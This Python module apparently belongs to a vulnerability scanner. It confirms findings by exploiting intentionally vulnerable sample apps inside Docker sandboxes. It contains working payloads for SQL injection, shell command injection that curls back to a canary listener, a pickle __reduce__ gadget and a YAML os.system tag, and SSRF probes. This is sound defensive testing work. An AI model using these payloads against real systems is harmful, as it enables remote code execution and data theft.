"""Verify stage: for confirmed findings in P4's own sample repos, actually
exploit the finding against a live, sandboxed copy of the target app instead
of trusting an LLM's description of what would happen.

P4 ships a small, fixed rule set (backend/rules/*.yaml), so verification is
deterministic code keyed by rule_id + repo, not an LLM-proposed request the
pipeline blindly executes — a wrong guess here (wrong port, wrong payload)
would be exactly the kind of mistake this stage exists to catch. The LLM's
role stays narrowed to Validate (the real judgment call) and to writing the
human-readable PoC narrative in prove.py.

Out of scope: this only knows how to sandbox the three apps under
sample_repos/ — for an arbitrary externally-scanned repo (the real
`p4 scan .` CI-gate use case) there is no way to know how to build/run that
app, so those findings simply come back unverified.
"""

from __future__ import annotations

import http.server
import pickle
import secrets
import socket
import subprocess
import threading
import time
from contextlib import contextmanager
from dataclasses import dataclass
from pathlib import Path

import requests

from .models import Finding, ValidationVerdict

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
DOCKER_BIN = "docker"
BUILD_TIMEOUT = 180
CONTAINER_READY_TIMEOUT = 20
REQUEST_TIMEOUT = 8
CANARY_WAIT = 8


@dataclass
class SandboxSpec:
    context_dir: Path
    port: int


SANDBOX_APPS: dict[str, SandboxSpec] = {
    "vuln_flask_api": SandboxSpec(REPO_ROOT / "sample_repos" / "vuln_flask_api", 5000),
    "vuln_flask_worker": SandboxSpec(REPO_ROOT / "sample_repos" / "vuln_flask_worker", 5001),
    "vuln_express_api": SandboxSpec(REPO_ROOT / "sample_repos" / "vuln_express_api", 3000),
}


@dataclass
class ExploitSpec:
    method: str
    path: str
    param: str | None = None  # query param name, for GET-based injections


# (repo, rule_id) -> where to send the exploit. Hand-mapped against P4's own
# fixed rule set + sample apps, not derived at runtime, for the same reason
# the exploitation itself is deterministic: this is demo-fixture knowledge,
# not something to infer or ask an LLM to guess.
ROUTES: dict[tuple[str, str], ExploitSpec] = {
    ("vuln_flask_api", "python-raw-sql-execute"): ExploitSpec("GET", "/orders/search", "customer"),
    ("vuln_flask_api", "python-os-system-call"): ExploitSpec("GET", "/reports/generate", "name"),
    ("vuln_flask_api", "python-pickle-loads"): ExploitSpec("POST", "/session/restore"),
    ("vuln_flask_api", "python-requests-outbound"): ExploitSpec("GET", "/webhooks/preview", "url"),
    ("vuln_flask_worker", "python-requests-outbound"): ExploitSpec(
        "GET", "/integrations/fetch", "manifest_url"
    ),
    ("vuln_flask_worker", "python-yaml-load"): ExploitSpec("POST", "/jobs/import"),
    ("vuln_express_api", "js-string-built-sql"): ExploitSpec("GET", "/orders/search", "customer"),
    ("vuln_express_api", "js-child-process-call"): ExploitSpec("GET", "/reports/generate", "name"),
    ("vuln_express_api", "js-outbound-http-call"): ExploitSpec("GET", "/webhooks/preview", "url"),
}

TECHNIQUE_BY_RULE: dict[str, str] = {
    "python-raw-sql-execute": "sqli",
    "js-string-built-sql": "sqli",
    "python-os-system-call": "oob-query",
    "js-child-process-call": "oob-query",
    "python-pickle-loads": "oob-pickle",
    "python-yaml-load": "oob-yaml",
    "python-requests-outbound": "ssrf",
    "js-outbound-http-call": "ssrf",
}


class CanaryListener:
    """A tiny background HTTP server used as an out-of-band callback target.

    A payload that reaches this URL from inside the sandboxed container
    proves a real request left it — the actual evidence behind SSRF and
    blind-RCE verification, not just a plausible-sounding description.
    """

    def __init__(self) -> None:
        self._hits: set[str] = set()
        self._lock = threading.Lock()
        listener = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def _record(self) -> None:
                token = self.path.strip("/").split("/")[0]
                with listener._lock:
                    listener._hits.add(token)
                self.send_response(200)
                self.end_headers()

            def do_GET(self) -> None:
                self._record()

            def do_POST(self) -> None:
                self._record()

            def log_message(self, *args: object) -> None:  # keep test/CLI output clean
                pass

        self._server = http.server.ThreadingHTTPServer(("0.0.0.0", 0), Handler)
        self.port = self._server.server_address[1]
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def new_token(self) -> str:
        return secrets.token_hex(8)

    def wait_for_hit(self, token: str, timeout: float | None = None) -> bool:
        # Read the module-level default dynamically (not as a def-time
        # default arg) so tests can monkeypatch CANARY_WAIT to keep the
        # "no callback received" path fast.
        deadline = time.monotonic() + (CANARY_WAIT if timeout is None else timeout)
        while time.monotonic() < deadline:
            with self._lock:
                if token in self._hits:
                    return True
            time.sleep(0.2)
        return False

    def shutdown(self) -> None:
        self._server.shutdown()
        self._server.server_close()


def _wait_until_ready(host: str, port: int, timeout: float) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            time.sleep(0.5)
    return False


@contextmanager
def spin_up_sandbox(repo_name: str):
    """Build and run a fresh, isolated container for one of P4's known
    sample apps, yield its base URL, and always tear it down."""
    spec = SANDBOX_APPS[repo_name]
    image_tag = f"p4-sandbox-{repo_name}"
    container_name = f"p4-sandbox-{repo_name}-{secrets.token_hex(4)}"
    try:
        subprocess.run(
            [DOCKER_BIN, "build", "-t", image_tag, str(spec.context_dir)],
            capture_output=True,
            text=True,
            timeout=BUILD_TIMEOUT,
            check=True,
        )
        subprocess.run(
            [
                DOCKER_BIN,
                "run",
                "-d",
                "--rm",
                "--name",
                container_name,
                "--add-host=host.docker.internal:host-gateway",
                "-p",
                f"{spec.port}:{spec.port}",
                image_tag,
            ],
            capture_output=True,
            text=True,
            timeout=30,
            check=True,
        )
        if not _wait_until_ready("127.0.0.1", spec.port, CONTAINER_READY_TIMEOUT):
            raise RuntimeError(f"{repo_name} sandbox did not become reachable in time")
        yield f"http://127.0.0.1:{spec.port}"
    finally:
        subprocess.run([DOCKER_BIN, "rm", "-f", container_name], capture_output=True, timeout=30)


def _callback_url(canary: CanaryListener, token: str) -> str:
    return f"http://host.docker.internal:{canary.port}/{token}"


def _verify_ssrf(base_url: str, spec: ExploitSpec, canary: CanaryListener) -> tuple[bool, str]:
    token = canary.new_token()
    try:
        requests.get(
            f"{base_url}{spec.path}",
            params={spec.param: _callback_url(canary, token)},
            timeout=REQUEST_TIMEOUT,
        )
    except requests.RequestException:
        pass  # the outbound call from *inside* the sandbox is the evidence, not this response
    if canary.wait_for_hit(token):
        return (
            True,
            f"The sandboxed app made a real outbound request to a callback URL we controlled ({spec.path}?{spec.param}=<callback>).",
        )
    return (
        False,
        f"No callback received within {CANARY_WAIT}s — the sandboxed app never made the outbound request.",
    )


def _verify_oob_query(base_url: str, spec: ExploitSpec, canary: CanaryListener) -> tuple[bool, str]:
    token = canary.new_token()
    payload = f"x; curl -s {_callback_url(canary, token)} #"
    try:
        requests.get(
            f"{base_url}{spec.path}", params={spec.param: payload}, timeout=REQUEST_TIMEOUT
        )
    except requests.RequestException:
        pass
    if canary.wait_for_hit(token):
        return (
            True,
            f"Injected shell metacharacters into `{spec.param}` and the sandboxed app executed our callback command.",
        )
    return False, f"No callback received within {CANARY_WAIT}s — command injection did not fire."


def _verify_oob_pickle(
    base_url: str, spec: ExploitSpec, canary: CanaryListener
) -> tuple[bool, str]:
    token = canary.new_token()
    command = f"curl -s {_callback_url(canary, token)}"

    class _Gadget:
        def __reduce__(self):
            # Route through eval/builtins rather than a direct (os.system,
            # (command,)) reference: os.system's __module__ is platform-
            # specific (`nt` on Windows, `posix` on Linux), so a payload
            # built on this host would fail to unpickle in the Linux
            # container with "No module named 'nt'". `eval` lives in the
            # portable `builtins` module on every platform.
            return (eval, (f"__import__('os').system({command!r})",))

    payload = pickle.dumps(_Gadget())
    try:
        requests.post(f"{base_url}{spec.path}", data=payload, timeout=REQUEST_TIMEOUT)
    except requests.RequestException:
        pass
    if canary.wait_for_hit(token):
        return (
            True,
            "A crafted pickle payload's __reduce__ gadget executed os.system() inside the sandbox and called our callback URL.",
        )
    return False, f"No callback received within {CANARY_WAIT}s — the pickle gadget did not execute."


def _verify_oob_yaml(base_url: str, spec: ExploitSpec, canary: CanaryListener) -> tuple[bool, str]:
    token = canary.new_token()
    command = f"curl -s {_callback_url(canary, token)}"
    yaml_payload = f'!!python/object/apply:os.system ["{command}"]'
    try:
        requests.post(f"{base_url}{spec.path}", data=yaml_payload.encode(), timeout=REQUEST_TIMEOUT)
    except requests.RequestException:
        pass
    if canary.wait_for_hit(token):
        return (
            True,
            "A crafted YAML `!!python/object/apply:os.system` tag executed inside the sandbox and called our callback URL.",
        )
    return False, f"No callback received within {CANARY_WAIT}s — the YAML gadget did not execute."


def _verify_sqli(base_url: str, spec: ExploitSpec) -> tuple[bool, str]:
    token = secrets.token_hex(6)
    injected = f"' OR '1'='1' -- {token}"
    try:
        baseline = requests.get(
            f"{base_url}{spec.path}", params={spec.param: "alice"}, timeout=REQUEST_TIMEOUT
        )
        attacked = requests.get(
            f"{base_url}{spec.path}", params={spec.param: injected}, timeout=REQUEST_TIMEOUT
        )
    except requests.RequestException as exc:
        return False, f"Request to sandbox failed: {exc}"

    if token in attacked.text:
        return (
            True,
            "The injected payload was reflected verbatim, unescaped, in the query the app built — the taint path has no sanitization.",
        )

    try:
        baseline_rows = len(baseline.json().get("rows", []))
        attacked_rows = len(attacked.json().get("rows", []))
    except ValueError:
        return False, "Could not confirm — the response wasn't the expected JSON shape."

    if attacked_rows > baseline_rows:
        return (
            True,
            f"The injected payload returned {attacked_rows} rows vs. {baseline_rows} for a normal request — the WHERE clause was bypassed.",
        )
    return (
        False,
        "Injected and baseline requests behaved the same — could not confirm exploitation.",
    )


_HANDLERS = {
    "ssrf": _verify_ssrf,
    "oob-query": _verify_oob_query,
    "oob-pickle": _verify_oob_pickle,
    "oob-yaml": _verify_oob_yaml,
}


def _verify_one(finding: Finding, base_url: str, canary: CanaryListener) -> None:
    spec = ROUTES.get((finding.repo, finding.rule_id))
    technique = TECHNIQUE_BY_RULE.get(finding.rule_id)
    if spec is None or technique is None:
        finding.verified = None
        finding.verification_detail = "No verification routine registered for this rule."
        return
    try:
        if technique == "sqli":
            verified, detail = _verify_sqli(base_url, spec)
        else:
            verified, detail = _HANDLERS[technique](base_url, spec, canary)
        finding.verified = verified
        finding.verification_detail = detail
    except Exception as exc:  # noqa: BLE001 - verification must never break the pipeline
        finding.verified = None
        finding.verification_detail = f"Verification errored: {exc}"


def verify_findings(findings: list[Finding]) -> list[Finding]:
    """Best-effort: attempts real sandboxed exploitation for confirmed
    findings in repos P4 knows how to run. Never raises — any failure
    (Docker missing, build failure, timeout) degrades to verified=None with
    a reason, so a broken sandbox never takes down the rest of the pipeline.
    """
    confirmed = [f for f in findings if f.verdict == ValidationVerdict.CONFIRMED]
    if not confirmed:
        return findings

    by_repo: dict[str, list[Finding]] = {}
    for f in confirmed:
        by_repo.setdefault(f.repo, []).append(f)

    for repo_name, repo_findings in by_repo.items():
        if repo_name not in SANDBOX_APPS:
            for f in repo_findings:
                f.verified = None
                f.verification_detail = "No sandbox runner registered for this repo."
            continue

        canary = CanaryListener()
        try:
            with spin_up_sandbox(repo_name) as base_url:
                for f in repo_findings:
                    _verify_one(f, base_url, canary)
        except Exception as exc:  # noqa: BLE001 - Docker unavailable, build failed, timed out, etc.
            for f in repo_findings:
                f.verified = None
                f.verification_detail = f"Sandbox unavailable: {exc}"
        finally:
            canary.shutdown()

    return findings
